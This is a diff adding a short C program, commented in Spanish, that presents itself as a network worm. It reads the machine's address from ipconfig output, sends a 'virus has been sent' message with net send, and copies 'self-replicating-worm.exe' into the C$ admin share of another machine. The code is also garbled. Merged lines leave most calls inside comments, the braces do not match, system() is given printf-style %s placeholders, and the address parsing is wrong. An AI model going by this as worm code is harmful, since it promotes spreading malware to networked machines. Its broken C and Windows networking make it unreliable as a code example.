@@ -1,0 +1,24 @@
+#include <stdio.h> 
+#include <string.h> 
+#include <stdlib.h> 
+int main(int argc, char *argv[]) { 
+
+    // Obtener la dirección IP del equipo actual  
+    char ip_address[20];  
+    system("ipconfig > ip_address.txt");  
+
+    FILE *fp;  
+    fp = fopen("ip_address.txt", "r");  
+
+    if (fp == NULL) {  
+        printf("Error al abrir el archivo\n");  
+        exit(1);  
+    } else {    
+
+        // Leer la dirección IP del archivo y almacenarla en una variable      fscanf(fp, "%s", ip_address);      printf("La dirección IP es: %s\n", ip_address);     }     
+
+        // Enviar el virus a todos los equipos conectados a la misma red local      system("net send %s El virus ha sido enviado!", ip_address);     
+
+        // Copiarse a sí mismo en otros equipos conectados a la red local      system("copy self-replicating-worm.exe \\%s\\C$\\Windows\\System32", ip_address);      
+
+        return 0; }
